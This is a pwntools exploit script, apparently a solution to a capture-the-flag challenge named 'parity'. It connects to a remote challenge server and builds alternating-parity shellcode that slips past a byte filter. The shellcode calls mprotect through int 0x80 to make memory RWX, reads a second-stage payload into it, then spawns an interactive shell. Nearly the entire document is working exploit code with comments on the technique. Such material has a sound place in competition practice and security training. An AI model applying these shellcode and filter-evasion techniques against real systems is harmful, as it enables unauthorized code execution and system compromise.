#!/usr/bin/env python3

from pwn import *

the_binary = "./parity"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("challs.actf.co", 31226)
elif args.STRACE:
    io = process(["strace", "-o" ,"strace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}

        # shellcode invocation
        break *0x4012f5

        continue
    """)

# Observations about our environment at the start of shellcode execution:
# - rax == rcx == rdi == r8 == r9 == r14 == r15 == 0
# - r11 == 0x246
# - r12 == addressof(_start)
# - rsi holds rwx memory address
#
# Some notes about our solution:
# - We can use `push rbp` as a one-byte "nop" for odd parity
# - We can use `nop` as a one-byte nop for even parity
# - The `syscall` instruction assembles to bytes that won't work; instead, we
#   can execute 32-bit ABI syscalls with `int 0x80`
sc = ""

# Step one: Change the target ELF to be in RWX memory by calling:
# eax=0x7d
# sys_mprotect(ebx=start, ecx=len, edx=prot)
sc += """
    nop
    push rbx
    pop rax

"""
for _ in range(10):
    sc += """
        pop rbp
        shr rax, 1
    """
for _ in range(10):
    sc += """
        pop rbp
        shl rax, 1
    """

sc += """
    pop rbp
    push rax
    pop rbx

    push 0x7d
    pop rax

    push rbp
    push 7
    pop rdx

    push rbp
    push 1
    nop
    pop rcx

    nop
    int 0x80
"""

# Step two: Read next-stage shellcode into the memory region whose permissions we just
#           changed.
# eax=0x3
# sys_read(ebx=fd, ecx=buf, edx=count)
sc += """
    push rbx
    nop
    pop rcx

    xor rax, rax
    pop rbp
    push rax
    pop rbx

    mov rdx, r11

    pop rbp
    inc rax
    pop rbp
    inc rax
    pop rbp
    inc rax

    int 0x80
"""

# Step 3: Jump into our newly-written shellcode
sc += """
    push rcx
    pop rax
    call rax
"""

# Print binary representation of assembled bytes to verify alternating parity.
if args.DISASM:
    compiled_sc = b""
    for line in sc.splitlines():
        if not (line := line.strip()):
            continue

        compiled_sc_line = asm(line)
        compiled_sc += compiled_sc_line

        print(line)
        for i in compiled_sc_line:
            print(bin(i))
        print()
else:
    compiled_sc = asm(sc)

assert len(compiled_sc) <= 0x2000
io.sendafter("> ", compiled_sc)

sleep(5)
io.send(asm(shellcraft.sh()))
io.interactive()
